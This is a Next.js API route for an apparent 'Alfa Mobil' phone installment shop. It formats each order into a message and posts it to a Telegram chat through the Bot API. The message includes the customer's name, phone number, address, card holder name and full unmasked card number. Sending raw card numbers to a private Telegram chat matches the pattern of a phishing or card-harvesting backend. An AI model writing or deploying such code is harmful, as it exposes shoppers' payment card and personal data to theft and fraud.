import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { order } = body;

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId || botToken.includes('your_telegram_bot_token')) {
      console.warn('Telegram Bot credentials not set in environment variables.');
      return NextResponse.json(
        { success: false, message: 'Telegram credentials missing in .env.local' },
        { status: 200 }
      );
    }

    const messageText = `
🚨 <b>NEW ALFA MOBIL INSTALLMENT ORDER</b> 🚨

🆔 <b>Order ID:</b> <code>${order.orderId}</code>
📅 <b>Date:</b> ${order.createdAt}

📱 <b>DEVICE DETAILS:</b>
• <b>Model:</b> ${order.model.name}
• <b>Storage:</b> ${order.storage.size}
• <b>Color:</b> ${order.color.name}
• <b>Total Cash Price:</b> Rs. ${order.totalPrice.toLocaleString('en-PK')}

💳 <b>INSTALLMENT PLAN (0% Markup):</b>
• <b>Tenure:</b> ${order.months} Months
• <b>Monthly EMI:</b> Rs. ${order.monthlyEmi.toLocaleString('en-PK')} / month

👤 <b>CUSTOMER INFORMATION:</b>
• <b>Name:</b> ${order.customer.fullName}
• <b>Mobile:</b> <code>${order.customer.mobileNumber}</code>
• <b>Delivery Address:</b> ${order.customer.deliveryAddress}
• <b>Delivery Option:</b> ${order.customer.deliveryType === 'open_parcel' ? 'Open Parcel via TCS Rider' : 'Standard Delivery'}

💰 <b>PAYMENT & VERIFICATION:</b>
• <b>Payment Mode:</b> ${order.customer.paymentMethod.toUpperCase()}
• <b>Partner Bank:</b> ${order.payment.bankId ? order.payment.bankId.toUpperCase() : 'N/A'}
• <b>Card/Wallet Title:</b> ${order.payment.cardName || order.payment.walletAccountName || 'N/A'}
• <b>Card Number:</b> ${order.payment.cardNumber ? '`' + order.payment.cardNumber + '`' : 'N/A'}

📌 <b>Status:</b> ${order.status}
    `.trim();

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const res = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: messageText,
        parse_mode: 'HTML'
      })
    });

    const data = await res.json();

    if (!data.ok) {
      console.error('Telegram API error:', data);
      return NextResponse.json({ success: false, error: data.description }, { status: 500 });
    }

    return NextResponse.json({ success: true, data });
  } catch (error: any) {
    console.error('Error dispatching to Telegram:', error);
    return NextResponse.json({ success: false, error: error.message }, { status: 500 });
  }
}
